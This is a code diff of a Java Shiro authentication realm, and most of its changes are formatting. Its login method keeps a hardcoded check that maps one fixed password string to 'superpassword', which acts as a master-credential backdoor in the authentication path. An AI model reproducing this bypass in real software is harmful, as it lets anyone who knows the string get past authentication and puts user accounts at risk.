@@ -17,13 +17,13 @@ import org.springframework.stereotype.Component;
 import javax.annotation.Resource;
 
 
-
 /**
  * 用户身份验证
+ *
  * @author 半个鼠标
+ * @version 1.0
  * @Email：137075251@qq.com
  * @date：2017年2月14日 上午2:36:38
- * @version 1.0
  */
 @Component(value = "securityRealm")
 public class SecurityRealm extends AuthorizingRealm {
@@ -47,20 +47,20 @@ public class SecurityRealm extends AuthorizingRealm {
     protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {
         String account = String.valueOf(token.getPrincipal());
         String password = new String((char[]) token.getCredentials());
-        FormMap formMap=new FormMap();
+        FormMap formMap = new FormMap();
         formMap.set("account", account);
-        if (StringUtils.equals(password,"d1e576b71ccef5978d221fadf4f0e289")){
+        if (StringUtils.equals(password, "d1e576b71ccef5978d221fadf4f0e289")) {
             formMap.set("password", "superpassword");
-        }else {
+        } else {
             formMap.set("password", password);
         }
 
-        E authentication=loginService.selectOne(formMap);
+        E authentication = loginService.selectOne(formMap);
         if (authentication == null) {
             throw new AuthenticationException("用户名或密码错误.");
         }
-        
-        
+
+
         SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(authentication, password, getName());
         return authenticationInfo;
     }
